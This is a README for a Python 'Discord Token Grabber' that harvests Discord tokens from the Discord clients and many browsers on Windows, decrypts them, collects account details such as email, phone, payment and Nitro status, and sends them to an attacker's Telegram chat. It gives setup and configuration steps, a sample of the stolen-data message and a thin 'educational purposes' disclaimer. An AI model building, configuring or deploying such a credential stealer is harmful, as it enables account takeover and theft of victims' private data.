# Discord Token Grabber with Telegram Integration

This Python script extracts Discord tokens from various applications on a Windows machine, retrieves user information (e.g., Nitro status, friends, guilds), and sends the data to a Telegram chat via the Telegram API.

**Warning**: This script accesses sensitive user data (e.g., Discord tokens, payment methods). Use it responsibly and legally. Sharing or using this script to harm others may violate Discord's Terms of Service and local laws.

## Features

- Extracts Discord tokens from multiple platforms (e.g., Discord, Chrome, Brave).
- Decrypts tokens using Windows CryptUnprotectData and AES-GCM.
- Fetches user details from Discord API (e.g., email, phone, Nitro, guilds).
- Sends data to a Telegram chat with a user avatar photo.

## Supported Platforms

- Discord, Discord Canary, Discord PTB, Lightcord
- Chrome, Chrome SxS, Microsoft Edge, Brave, Yandex, Vivaldi, etc.
- Opera, Opera GX, Amigo, Torch, Kometa, Orbitum, etc.

## Prerequisites

- **Operating System**: Windows only (script checks for `os.name == "nt"`).
- **Python**: Version 3.x installed.
- **Telegram Bot**: A Telegram bot token and chat ID to receive data.

## Installation

1. **Clone the Repository**:

```bash
   git clone https://github.com/yourusername/discord-token-grabber.git
   cd discord-token-grabber
```

2. **Install Dependencies**:
   The script automatically installs missing modules (`pypiwin32`, `pycryptodome`) on first run. Alternatively, install them manually:
   pip install pypiwin32 pycryptodome requests bcrypt
3. **Set Up Telegram Bot**:

- Create a Telegram bot via [BotFather](https://t.me/BotFather) and get your bot token (e.g., `12345:ABCDEF...`).
- Get your chat ID (e.g., `-ๅ23456789`) by messaging your bot and using a service like `@GetIDsBot`.

## Usage

1. **Edit the Script**:

- Open `main.py`.
- Replace the chat_id in the data dictionary with your Telegram chat ID: **Line 198**

  ```python
  "chat_id": "your_chat_id",
  ```

  Replace the Telegram bot token placeholder **Line 216**

  ```python
  if __name__ == "__main__":
      main("Your_teleram_bot_token")
  ```

2. **Run the Script:**

```bash
    python main.py
```

## Example Output in Telegram

1. **The script sends a message like this**:
   User ID: 123456789
   Email: user@example.com
   Phone Number: +1234567890
   Friends: 42
   Guilds: 15
   Admin Permissions:
   - [Server Name]: 5000 members; .gg/invite
     MFA Enabled: True
     Flags: 256
     Locale: en-US
     Verified: True
     Nitro Informations:
     Has Nitro: True
     Expiration Date: 31/12/2023 at 23:59:59
     Boosts Available: 2 - Available now - Available on 01/01/2024 at 12:00:00
     IP: 192.168.1.1
     Username: WindowsUser
     PC Name: DESKTOP-ABC123
     Token Location: Discord
     Token: [Spoiler-hidden token]

## Configuration

- **Custom Chat ID**: Edit chat_id in the data dictionary to send to a different Telegram chat.
- **Custom Photo**: Modify get_image() to change avatar size or use a different image URL.
- **Add Platforms**: Extend the PATHS dictionary to support more applications.

## Security Notes

- **Token Exposure**: The script sends the Discord token in a Telegram message (hidden with <tg-spoiler>). Ensure your Telegram chat is private and secure.
- **Local Storage**: Tokens are extracted from Local Storage\leveldb. Avoid running on shared or untrusted machines.
- **Encryption**: Tokens are decrypted using Windows DPAPI and AES-GCM. Keep your system secure to prevent key leaks.

## Troubleshooting

- **Permission Denied**: Run as Administrator.

- **Telegram Errors**: Verify bot token and chat ID if sendPhoto fails (check res.json() output).
- **Module Issues**: Ensure internet connection for auto-install.

## License

- **Unlicensed**. Use at your own risk.

## Disclaimer

- For educational purposes only. The author is not liable for misuse or consequences.
